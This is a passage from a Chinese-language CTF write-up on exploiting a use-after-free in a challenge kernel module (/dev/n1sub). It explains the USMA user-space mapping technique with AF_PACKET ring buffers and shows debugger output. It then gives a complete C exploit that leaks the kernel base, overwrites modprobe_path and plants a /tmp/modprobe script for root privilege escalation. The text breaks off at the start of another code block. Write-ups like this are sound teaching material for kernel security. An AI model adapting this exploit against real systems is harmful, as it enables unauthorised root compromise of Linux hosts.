<li><code>packet_mmap</code> 将这些内核虚拟地址代表的物理页映射进用户态，这样普通用户就能在用户态对这些物理页直接进行读写</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vm_insert_page</span><span class="params">(struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</span></span></span><br><span class="line"><span class="params"><span class="function">			struct page *page)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (addr &lt; vma-&gt;vm_start || addr &gt;= vma-&gt;vm_end)</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	<span class="keyword">if</span> (!page_count(page))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_MIXEDMAP)) &#123;</span><br><span class="line">		BUG_ON(mmap_read_trylock(vma-&gt;vm_mm));</span><br><span class="line">		BUG_ON(vma-&gt;vm_flags &amp; VM_PFNMAP);</span><br><span class="line">		vma-&gt;vm_flags |= VM_MIXEDMAP;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> insert_page(vma, addr, page, vma-&gt;vm_page_prot);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(vm_insert_page);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">insert_page</span><span class="params">(struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</span></span></span><br><span class="line"><span class="params"><span class="function">			struct page *page, <span class="keyword">pgprot_t</span> prot)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> vma-&gt;vm_mm;</span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">	<span class="keyword">pte_t</span> *pte;</span><br><span class="line">	<span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line"></span><br><span class="line">	retval = validate_page_before_insert(page);</span><br><span class="line">	<span class="keyword">if</span> (retval)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	retval = -ENOMEM;</span><br><span class="line">	pte = get_locked_pte(mm, addr, &amp;ptl);</span><br><span class="line">	<span class="keyword">if</span> (!pte)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	retval = insert_page_into_pte_locked(mm, pte, addr, page, prot);</span><br><span class="line">	pte_unmap_unlock(pte, ptl);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">validate_page_before_insert</span><span class="params">(struct page *page)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (PageAnon(page) || PageSlab(page) || page_has_type(page))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	flush_dcache_page(page);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>检查 page 是否为匿名页，是否为 Slab 子系统分配的页，以及 page 是否含有 type</li>
<li>内存页的 type 总共有以下几种：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_buddy	0x00000080	<span class="comment">/* 伙伴系统中的页 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_offline	0x00000100	<span class="comment">/* 为内存交换出去的页 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_kmemcg	0x00000200	<span class="comment">/* 为kmemcg使用 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_table	0x00000400	<span class="comment">/* 作为页表的页 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_guard	0x00000800	<span class="comment">/* 作为内存屏障的页 */</span></span></span><br></pre></td></tr></table></figure>
<p>通过如下函数快速的创建一个 AF_PACKET 协议的原始套接字：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)); <span class="comment">/* AF_PACKET是原始套接字协议,是一种特殊的套接字协议,可以是数据链路层原始套接字 */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> version = TPACKET_V3;</span><br><span class="line">setsockopt(s, SOL_PACKET, PACKET_VERSION, &amp;version, <span class="keyword">sizeof</span>(version)); <span class="comment">/* 设置当前AF_PACKET套接字协议版本为TPACKET_V3 */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">req3</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;req3, <span class="number">0</span>, <span class="keyword">sizeof</span>(req3));</span><br><span class="line">req3.tp_block_size = block_size;</span><br><span class="line">req3.tp_block_nr = block_nr;</span><br><span class="line">req3.tp_frame_size = frame_size;</span><br><span class="line">req3.tp_frame_nr = frame_nr;</span><br><span class="line">req3.tp_retire_blk_tov = retire_blk_tov;</span><br><span class="line">req3.tp_sizeof_priv = <span class="number">0</span>;</span><br><span class="line">req3.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line">setsockopt(recv_fd, SOL_PACKET, PACKET_RX_RING, &amp;req3, <span class="keyword">sizeof</span>(req3)); <span class="comment">/* 创建ring buffer(pg_vec) */</span></span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>有 UAF 漏洞，但是 size 是随机的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">size = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)get_random_u32() % <span class="number">0x7B0</span> + <span class="number">0x68</span>;</span><br><span class="line">sub_offset = ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)get_random_u32() % (size - <span class="number">0x50</span>) + <span class="number">0x50</span>) &amp; <span class="number">0xFFFFFFF8</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>size = [0x68, 0x818]</code></li>
<li><code>sub_offset = [0x50, sub_size]</code></li>
</ul>
<p>此时需要使用 USMA（用户态映射攻击）</p>
<ul>
<li>参考：<a target="_blank" rel="noopener" href="https://vul.360.net/archives/391">USMA:用户态映射攻击 (360.net)</a> </li>
</ul>
<p>具体思路就是先申请一个 chunk 并读取 <code>sub_size</code>，释放后根据 <code>sub_size</code> 的大小来创建一个与之匹配的 <code>ring buffer(pg_vec)</code>，由于程序没有开 slab freelist 随机化，因此这个 UAF 大概率会命中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">   save_status();</span><br><span class="line">   bind_core(<span class="number">0</span>);</span><br><span class="line">   unshare_setup();</span><br><span class="line">   fd = open(<span class="string">&quot;/dev/n1sub&quot;</span>, O_RDWR);</span><br><span class="line">   <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) </span><br><span class="line">       err_exit(<span class="string">&quot;open /dev/n1sub&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">int</span> socket_list[<span class="number">0x100</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x80</span>; i++) </span><br><span class="line">       socket_list[i] = create_socket_and_alloc_pages(PAGE_SIZE, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">   sub_size = add();</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;sub_size: 0x%x\n&quot;</span>,sub_size);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;sub_offset: 0x%x\n&quot;</span>,sub_offset);</span><br><span class="line">   <span class="keyword">int</span> block_nr = sub_size / <span class="number">0x8</span>;</span><br><span class="line">dele(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">int</span> packet_fds = packet_socket_setup(PAGE_SIZE, <span class="number">0x800</span>, block_nr, <span class="number">0</span>, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure>
<p>内核模块会以 <code>sub_offset</code> 为偏移来修改 <code>ring buffer(pg_vec)</code> 中的数据（连续物理页的虚拟地址），导致程序映射到非预期的内存空间</p>
<ul>
<li>当程序执行 <code>mmap(NULL, PAGE_SIZE * block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, packet_fds, 0)</code> 进行映射时，函数 <code>packet_mmap</code> 会将 <code>ring buffer(pg_vec)</code> 中的各个物理页映射给用户态程序（表现为一个大内存块）</li>
<li>另外 <code>validate_page_before_insert</code> 函数会进行检查，这导致通常情况下可以用于泄露的物理页没法成功映射（PG_buddy 表示该物理页可以被分配给其他进程使用，而 slab 分配的页面都带有 PG_buddy 标记）</li>
</ul>
<p>之后我们可以通过 <code>sub_offset</code> 来定位非预期物理页的位置，进而打印出非预期的数据</p>
<p>这里的内存扫描有点困难，需要一个可以用于泄露或者劫持程序流程的物理页：</p>
<ul>
<li>用于泄露的内存页：先关闭内核地址随机化，再打印指针即可</li>
<li>劫持程序的内存页：尝试覆盖指针，看看是否会引发段错误</li>
</ul>
<p>这里我参考了网上 wp 的方法：先断点到 <code>kfree(bufs[arg])</code>，尝试查找 <code>bufs</code> 所在的内存页</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t qword <span class="number">0xffff888004e12000</span></span><br><span class="line">Searching <span class="keyword">for</span> value: b<span class="number">&#x27;</span>\x00 \xe1\x04\x80\x88\xff\xff<span class="number">&#x27;</span></span><br><span class="line">&lt;pt&gt;            <span class="number">0xffff888004844358</span> <span class="number">0xffff888004e12000</span></span><br><span class="line">&lt;pt&gt;            <span class="number">0xffff888004cc3370</span> <span class="number">0xffff888004e12000</span> <span class="comment">/* target */</span></span><br><span class="line">&lt;pt&gt;            <span class="number">0xffff888004d5ad98</span> <span class="number">0xffff888004e12000</span></span><br><span class="line">&lt;pt&gt;            <span class="number">0xffff888004e12570</span> <span class="number">0xffff888004e12000</span></span><br><span class="line">&lt;pt&gt;            <span class="number">0xffffc90000217d98</span> <span class="number">0xffff888004e12000</span></span><br><span class="line">&lt;pt&gt;            <span class="number">0xffffffffc0002370</span> <span class="number">0xffff888004e12000</span> <span class="comment">/* target */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>打印 <code>0xffffffffc0002370</code> 所在内存页</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffffffffc0002000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0xffffffffc0002000</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0xffffffffc0002008</span> —▸ <span class="number">0xffffffff8293d8c0</span> ◂— <span class="number">0xffffffffc0002008</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0xffffffffc0002010</span> —▸ <span class="number">0xffffffff8293d8c0</span> —▸ <span class="number">0xffffffffc0002008</span> ◂— <span class="number">0xffffffff8293d8c0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0xffffffffc0002018</span> ◂— <span class="number">0x627573</span> <span class="comment">/* &#x27;sub&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0xffffffffc0002020</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffff888004cc3000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0xffff888004cc3000</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0xffff888004cc3008</span> —▸ <span class="number">0xffffffff8293d8c0</span> —▸ <span class="number">0xffffffffc0002008</span> ◂— <span class="number">0xffffffff8293d8c0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0xffff888004cc3010</span> —▸ <span class="number">0xffffffff8293d8c0</span> —▸ <span class="number">0xffffffffc0002008</span> ◂— <span class="number">0xffffffff8293d8c0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0xffff888004cc3018</span> ◂— <span class="number">0x627573</span> <span class="comment">/* &#x27;sub&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0xffff888004cc3020</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br></pre></td></tr></table></figure>
<ul>
<li>此时我们可以发现 <code>0xffff888004cc3000</code> 和 <code>0xffffffffc0002000</code> 都映射了内核模块的 bss 段</li>
</ul>
<p>对于 <code>0xffffffffc0002000</code> 我们是控制不了的，但程序不知道是什么原因也在 <code>0xffff888004cc3000</code> 映射了一遍 bss 段，这就导致了我们可以直接控制 bss 段上的地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> *unexpected_page;</span><br><span class="line"><span class="keyword">int</span> index;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint64_t</span> i = <span class="number">0</span>; i &lt; PAGE_SIZE; i++) </span><br><span class="line">        edit(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> *page = mmap(<span class="literal">NULL</span>, PAGE_SIZE * block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, packet_fds, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">uint64_t</span>)page == <span class="number">-1</span>) </span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    </span><br><span class="line">    print_hex(page, <span class="number">0x100</span>);</span><br><span class="line">    unexpected_page = (<span class="keyword">uint64_t</span> *)((sub_offset / <span class="number">0x8</span>) * PAGE_SIZE + page);</span><br><span class="line">    <span class="keyword">if</span> (unexpected_page[<span class="number">0x3</span>] == <span class="number">0x0000000000627573</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;find target&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    munmap(page, PAGE_SIZE * block_nr);</span><br><span class="line">    <span class="keyword">if</span> (index++ &gt; <span class="number">0x200</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;UAF error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>控制 bss 段上的地址，配合内核模块实现的功能就可以任意写（只能减少）</p>
<p>接下来最简单的提权方法就是修改 <code>modprobe_path</code>（将 <code>/sbin/modprobe</code> 修改为 <code>/tmp//modprobe</code>）</p>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernelpwn.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>	PAGE_SIZE	0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">argg</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> sub_size, sub_offset;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, <span class="number">0xDEADBEE0</span>, &amp;sub_offset);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dele</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, <span class="number">0xDEADBEE1</span>, index);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, <span class="number">0xDEADBEE2</span>, index);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv, <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    unshare_setup();</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/n1sub&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) </span><br><span class="line">        err_exit(<span class="string">&quot;open /dev/n1sub&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> socket_list[<span class="number">0x100</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x80</span>; i++) </span><br><span class="line">        socket_list[i] = create_socket_and_alloc_pages(PAGE_SIZE, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    sub_size = add();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sub_size: 0x%x\n&quot;</span>,sub_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sub_offset: 0x%x\n&quot;</span>,sub_offset);</span><br><span class="line">    <span class="keyword">int</span> block_nr = sub_size / <span class="number">0x8</span>;</span><br><span class="line">	dele(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> packet_fds = packet_socket_setup(PAGE_SIZE, <span class="number">0x800</span>, block_nr, <span class="number">0</span>, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> *unexpected_page;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">uint64_t</span> i = <span class="number">0</span>; i &lt; PAGE_SIZE; i++) </span><br><span class="line">            edit(<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">char</span> *page = mmap(<span class="literal">NULL</span>, PAGE_SIZE * block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, packet_fds, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">uint64_t</span>)page == <span class="number">-1</span>) </span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        </span><br><span class="line">        print_hex(page, <span class="number">0x100</span>);</span><br><span class="line">        unexpected_page = (<span class="keyword">uint64_t</span> *)((sub_offset / <span class="number">0x8</span>) * PAGE_SIZE + page);</span><br><span class="line">        <span class="keyword">if</span> (unexpected_page[<span class="number">0x3</span>] == <span class="number">0x0000000000627573</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;find target&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        munmap(page, PAGE_SIZE * block_nr);</span><br><span class="line">        <span class="keyword">if</span> (index++ &gt; <span class="number">0x200</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;UAF error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_base = unexpected_page[<span class="number">0xF</span>] - <span class="number">0x1851720</span>;</span><br><span class="line">	<span class="keyword">uint64_t</span> modprobe_path = kernel_base + <span class="number">0x1852420</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;kernel_base: 0x%lx\n&quot;</span>, kernel_base);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;modprobe_path: 0x%lx\n&quot;</span>, modprobe_path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> difference[] = &#123;<span class="number">0</span>, <span class="number">0xFF</span>, <span class="number">0xF4</span>, <span class="number">0xF8</span>, <span class="number">0x3E</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">0x5</span>; i++)&#123;</span><br><span class="line">		unexpected_page[<span class="number">0x6E</span>] = modprobe_path - sub_offset + i;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">uint32_t</span> j = <span class="number">0</span>; j &lt; difference[i]; j++) </span><br><span class="line">            edit(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;echo &#x27;#!/bin/sh\nchmod 777 /flag&#x27; &gt; /tmp/modprobe&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;chmod +x /tmp/modprobe&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	system(<span class="string">&quot;/tmp/dummy&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 